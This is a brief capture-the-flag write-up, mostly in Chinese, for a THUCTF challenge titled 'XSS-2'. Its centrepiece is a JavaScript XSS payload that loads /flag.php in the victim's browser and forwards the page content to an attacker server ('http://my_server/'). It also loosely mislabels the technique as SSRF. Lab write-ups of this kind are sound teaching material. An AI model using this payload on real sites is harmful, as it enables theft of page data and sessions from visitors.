XSS-2 400 points
================

题意
-------------

The flag is in flag.php : ), read it using XSS, please.

http://host:port

解题步骤
-------------

一开始尝试和 [XSS1](XSS1.md) 一样的方法获取 Cookie 然后访问 `/flag.php` ，但是一直拿不到，怀疑是通过别的字段来判断是否为 `Admin` 。于是，采用 `SSRF(Server Side Request Forge)` 和 `XMLHttpRequest` 获取到了 `/flag.php` 中的信息。

```
var xhr = new XMLHttpRequest();
xhr.onload = function get() {
        var body = this.responseText;
        var xhr2 = new XMLHttpRequest();
        xhr2.open("GET", "http://my_server/"+escape(body));
        xhr2.send();
};
xhr.open("GET", "/flag.php", true);
xhr.send();
```

得到了 `THUCTF{YoU_G37_thE_PagE_c0Nten7_bY_XSS}` 。